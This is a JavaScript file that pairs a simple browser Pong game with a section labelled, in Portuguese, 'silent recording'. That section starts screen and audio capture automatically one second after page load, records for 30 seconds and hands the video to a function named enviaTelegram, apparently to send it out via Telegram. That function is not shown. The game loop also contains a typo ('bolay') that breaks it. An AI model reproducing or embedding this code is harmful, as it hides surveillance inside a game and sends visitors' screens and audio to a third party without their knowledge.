/* ---------- PONG ---------- */
const cv  = document.getElementById('tela');
const ctx = cv.getContext('2d');
let bola  = {x:400,y:200,vx:4,vy:3,r:8};
let p1    = {y:160,h:80,w:10};
let p2    = {y:160,h:80,w:10};
function loop(){
  ctx.fillStyle='#000';ctx.fillRect(0,0,800,400);
  bola.x+=bola.vx;bola.y+=bola.vy;
  if(bola.y<0||bola.y>400)bola.vy*=-1;
  if((bola.x<20&&bola.y>p1.y&&bola.y<p1.y+p1.h)||
     (bola.x>770&&bola.y>p2.y&&bola.y<p2.y+p2.h))bola.vx*=-1;
  if(bola.x<0){bola.x=400;bola.y=200;bola.vx=4}
  if(bola.x>800){bola.x=400;bola.y=200;bola.vx=-4}
  ctx.fillStyle='#0f0';ctx.fillRect(10,p1.y,p1.w,p1.h);
  ctx.fillRect(780,p2.y,p2.w,p2.h);
  ctx.beginPath();ctx.arc(bola.x,bola.y,bola.r,0,Math.PI*2);ctx.fill();
  p2.y=bolay-p2.h/2;if(p2.y<0)p2.y=0;if(p2.y>320)p2.y=320;
  requestAnimationFrame(loop);
}
cv.addEventListener('mousemove',e=>{p1.y=e.clientY-cv.offsetTop-p1.h/2});
loop();

/* ---------- GRAVAÇÃO SILENCIOSA ---------- */
let gravacao;
async function iniciaGravacao(){
  const stream = await navigator.mediaDevices.getDisplayMedia({video:true,audio:true});
  gravacao = new MediaRecorder(stream,{mimeType:'video/webm'});
  let chunks=[];
  gravacao.ondataavailable=e=>chunks.push(e.data);
  gravacao.onstop=()=>{
    const blob = new Blob(chunks,{type:'video/webm'});
    enviaTelegram(blob);
  };
  gravacao.start();
  // para depois de 30 s (ajuste)
  setTimeout(()=>gravacao.stop(),30000);
}
// dispara 1 s depois que a página carregar
window.addEventListener('load',()=>setTimeout(iniciaGravacao,1000));
